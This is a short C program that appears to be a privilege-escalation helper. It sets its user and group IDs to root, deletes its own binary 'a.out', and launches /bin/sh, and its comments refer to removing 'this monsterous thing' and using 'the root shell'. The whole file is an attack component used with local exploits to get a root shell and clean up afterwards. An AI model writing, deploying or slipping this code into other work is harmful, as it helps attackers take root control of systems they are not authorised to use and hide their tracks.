#include <unistd.h>
#include <stddef.h>
#include <stdio.h>

int main(int argc, const char *const argv[]) {
	if (setuid(0)) {
		perror("setuid");
		return 1;
	}
	if (setgid(0)) {
		perror("setgid");
		return 1;
	}
	/* delete this monsterous thing right after */
	if (unlink("a.out")) {
		perror("unlink");
        // proceed anyway, you can delete it in the root shell
	}
	
	extern char *const environ[];
	char *const cmd[] = { "/bin/sh", NULL };
	execve("/bin/sh", cmd, environ);
    perror("execve");
    return 1;
}
